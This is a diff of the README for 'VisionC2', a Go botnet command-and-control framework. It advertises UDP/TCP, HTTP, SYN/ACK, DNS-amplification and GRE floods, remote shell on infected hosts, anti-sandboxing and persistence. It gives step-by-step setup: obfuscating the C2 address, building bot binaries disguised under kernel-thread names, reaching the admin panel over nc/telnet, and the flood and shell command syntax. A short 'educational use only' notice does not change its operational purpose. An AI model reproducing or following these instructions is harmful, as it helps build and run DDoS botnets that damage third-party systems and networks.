@@ -1,19 +1,13 @@
-
----
-
 # VisionC2
 
-### Botnet Command & Control (C2) Framework
+### Modern Botnet Command & Control (C2) Framework
 
 ![VisionC2 Banner](https://img.shields.io/badge/VisioNNet-V3-red)
 ![Go Version](https://img.shields.io/badge/Go-1.21+-blue)
 ![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)
 
-**VisionC2** is a Go-based Command & Control (C2) framework focused on Layer4/Layer7 Floods aswell as Remote Shell Execution.
-It features TLS-encrypted communications, multi-architecture support, and centralized bot management.
-
-
-<img width="1152" height="577" alt="Screenshot 2026-01-19 122231" src="https://github.com/user-attachments/assets/bc373b3f-0832-4e71-ac50-4b2600d2b25b" />
+**VisionC2** is a Go-based Command & Control (C2) framework focused on Layer4/Layer7 floods and remote shell execution.  
+It features TLS-encrypted communication, multi-architecture bot clients, and centralized management.
 
 ---
 
@@ -21,41 +15,37 @@ It features TLS-encrypted communications, multi-architecture support, and centra
 
 ### C2 Server
 
-* **TLS Encryption** – Secure bot-to-server communications
-* **Multi-User Support** – Role-based authentication
-* **Bot Management** – Real-time monitoring and control
-* **Attack Coordination** – Centralized command execution
-* **Persistence Handling** – Automatic bot reconnection and tracking
+- **TLS Encryption** &mdash; Secure bot-to-server comms
+- **Multi-User, Role-Based Auth** &mdash; Support for multiple admins or operators
+- **Real-Time Bot Management** &mdash; Live monitoring and control
+- **Centralized Attack Coordination** &mdash; Issue simultaneous commands to botnet clients
+- **Persistence Handling** &mdash; Handles bot reconnections and state tracking
 
 ### Bot Client
 
-* **Multi-Architecture Support** – 14 supported CPU architectures
-* **Anti-Sandboxing** – Multi-stage sandbox detection
-* **Persistence Mechanisms** – Multiple survival techniques
-* **Remote Command Execution** – Run Commands from the bots shell via detatched/streamed/normal 
-* **Attack Capabilities**:
-
-  * UDP / TCP Flood
-  * HTTP Flood
-  * SYN / ACK Flood
-  * DNS Amplification
-  * GRE Flood
-
+- **14+ CPU Architectures Supported**
+- **Anti-Sandboxing** &mdash; Multi-stage detection/evasion
+- **Persistence Mechanisms** &mdash; Multi-layered survival techniques
+- **Remote Shell Execution** &mdash; Detach, stream, or normal shell command execution
+- **Attack Capabilities**:
+  - UDP / TCP Flood
+  - HTTP Flood
+  - SYN / ACK Flood
+  - DNS Amplification
+  - GRE Flood
 
 ---
 
 ## 🔧 Prerequisites
 
-### System Requirements
+### Requirements
 
-* **Go 1.21+** (build from source)
-* **UPX** – Binary compression
-* **OpenSSL** – Certificate generation
-* **NoMoreUPX** (recommended) – UPX string removal
+- **Go 1.21+** (install for building from source)
+- **UPX** &mdash; For compressing binaries
+- **OpenSSL** &mdash; For TLS certificate creation
+- **NoMoreUPX** (recommended) &mdash; [UPX string remover](https://github.com/Syn2Much/upx-stripper)
 
-  * [https://github.com/Syn2Much/upx-stripper](https://github.com/Syn2Much/upx-stripper)
-
-### Dependency Installation
+### Install Dependencies
 
 #### Ubuntu / Debian
 
@@ -70,43 +60,31 @@ sudo apt install -y golang-go upx-ucl openssl git
 sudo yum install -y golang upx openssl git
 ```
 
-#### macOS
-
-```bash
-brew install go upx openssl
-```
-
 ---
 
-## 📜 TLS Certificate Generation
+## 📜 TLS Certificate Setup
 
-VisionC2 requires TLS certificates for secure communication.
+VisionC2 requires TLS certificates to secure bot communication.
 
-### Option A: Self-Signed (Testing / Development)
+### Option A: Self-Signed Certificate (For dev/testing)
 
 ```bash
 openssl genrsa -out server.key 2048
-openssl req -new -key server.key -out server.csr \
-  -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"
-openssl x509 -req -days 365 -in server.csr \
-  -signkey server.key -out server.crt
-
+openssl req -new -key server.key -out server.csr -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"
+openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt
 chmod 600 server.key
 chmod 644 server.crt
 ```
 
-### Option B: Let’s Encrypt (Production)
+### Option B: Let’s Encrypt (Recommended for production)
 
 ```bash
 sudo apt install certbot
 sudo certbot certonly --standalone -d yourdomain.com
 ```
 
-Certificates will be located at:
-
-```
-/etc/letsencrypt/live/yourdomain.com/
-```
+Certificates will be in:  
+`/etc/letsencrypt/live/yourdomain.com/`
 
 ---
 
@@ -121,7 +99,7 @@ cd VisionC2
 
 ### 2. Configure the C2 Server
 
-Edit `cnc/main.go`:
+Edit `cnc/main.go` and set:
 
 ```go
 const (
@@ -132,7 +110,7 @@ const (
 )
 ```
 
-Update authentication values:
+Update protocol constants:
 
 ```go
 const (
@@ -149,13 +127,13 @@ Edit `bot/main.go`:
 const gothTits = "OBFUSCATED_C2_STRING"
 ```
 
-Generate the obfuscated address:
+Generate the obfuscated string:
 
 ```bash
 python3 tools/obfuscate_c2.py "YOUR_C2_IP:443"
 ```
 
-Replace both `gothTits` and `requestMore()` accordingly.
+Update both `gothTits` and `requestMore()` with the new string.
 
 ### 4. Build Bot Binaries
 
@@ -172,28 +150,30 @@ cd cnc
 go run .
 ```
 
-A default `users.json` file will be generated automatically.
+A default `users.json` will be created on first run.
 
-### 6. Connect to Admin Interface
+### 6. Connect to the Admin Interface
 
 ```bash
 nc YOUR_SERVER_IP 420
 # or
 telnet YOUR_SERVER_IP 420
+
+enter "spamtec" to make login screen appear once connected //change this to secret key of choice 
 ```
 
 ---
 
-## 🛠️ Administration Commands
+## 🛠️ Admin Commands
 
 ### Bot Management
 
 ```
-bots
-!info
-!persist
-!reinstall
-!lolnogtfo
+bots           # List bots
+!info          # More info
+!persist       # Persistence control
+!reinstall     # Force reinstall
+!lolnogtfo     # Remove/uninstall
 ```
 
 ### Attack Commands
@@ -208,59 +188,35 @@ bots
 !dns <ip> <port> <time>
 ```
 
-### Shell & System
+### System / Shell
 
 ```
 !shell <cmd>
 !stream <cmd>
 !detach <cmd>
-clear | cls
-help | ?
+clear   | cls
+help    | ?
 ongoing
-logout | exit
+logout  | exit
 ```
 
 ---
 
-## 📊 Supported Architectures
+## ⚖️ Legal & Ethical Notice
 
-| Binary      | Architecture | GOOS  | GOARCH   |
-| ----------- | ------------ | ----- | -------- |
-| kworkerd0   | x86 (32-bit) | linux | 386      |
-| ethd0       | x86_64       | linux | amd64    |
-| mdsync1     | ARMv7        | linux | arm      |
-| ksnapd0     | ARMv5        | linux | arm      |
-| kswapd1     | ARMv6        | linux | arm      |
-| ip6addrd    | ARM64        | linux | arm64    |
-| deferwqd    | MIPS         | linux | mips     |
-| devfreqd0   | MIPSLE       | linux | mipsle   |
-| kintegrity0 | MIPS64       | linux | mips64   |
-| biosd0      | MIPS64LE     | linux | mips64le |
-| kpsmoused0  | PPC64        | linux | ppc64    |
-| ttmswapd    | PPC64LE      | linux | ppc64le  |
-| vredisd0    | s390x        | linux | s390x    |
-| kvmirqd     | RISC-V 64    | linux | riscv64  |
+This software is for **educational and authorized security research only**.
 
+By using VisionC2 you agree to:
 
----
-
-## ⚖️ Legal & Ethical Use
-
-This project is intended **strictly for educational and authorized security research**.
-
-You agree to:
-
-1. Obtain explicit permission before testing
-2. Comply with all applicable laws
-3. Accept full responsibility for usage
-4. Avoid malicious or unauthorized deployment
+1. Obtain explicit permission before testing/deployment
+2. Follow all applicable laws
+3. Take full responsibility for any use of the code
+4. Never use for malicious or unauthorized purposes
 
 ---
 
 ## 📧 Contact
 
-**[dev@sinners.city](mailto:dev@sinners.city)**
+[dev@sinners.city](mailto:dev@sinners.city)
 
 ---
-
-
